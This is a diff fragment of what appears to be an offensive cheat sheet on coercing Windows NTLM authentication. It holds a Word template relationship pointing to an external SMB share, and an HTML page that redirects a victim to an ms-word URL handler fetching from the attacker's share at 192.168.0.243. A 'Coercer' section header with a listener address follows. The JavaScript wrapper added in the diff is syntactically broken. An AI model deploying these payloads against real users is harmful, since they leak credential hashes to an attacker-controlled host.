@@ -338,20 +338,19 @@ IconIndex=1
 	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://192.168.0.243/share/Template.dotx" TargetMode="External"/>
 </Relationships>
 
-#### Coerce 5 - Url Handler
- 
-
- <!-- ```js
-let foo = 'bar';
+#### Coerce 5 - Url Handler 
+```js
+let foo = '<!DOCTYPE html>
+<html>
+	<script>
+		location.href = 'ms-word:ofe|u|\\192.168.0.243/share/leak.docx';
+	</script>
+</html>';
 
 console.log(foo);
 ```
-<!DOCTYPE html>
-<html>
-	<script>
-		location.href = 'ms        -word:        ofe|u|\\192.168.0.243/share/leak.docx';
-	</script>
-</html> -->
+
+
 
 #### Coerce 6 - w/ Creds - Coercer forced authentication of a server to our machine
 listen="192.168.0.243"
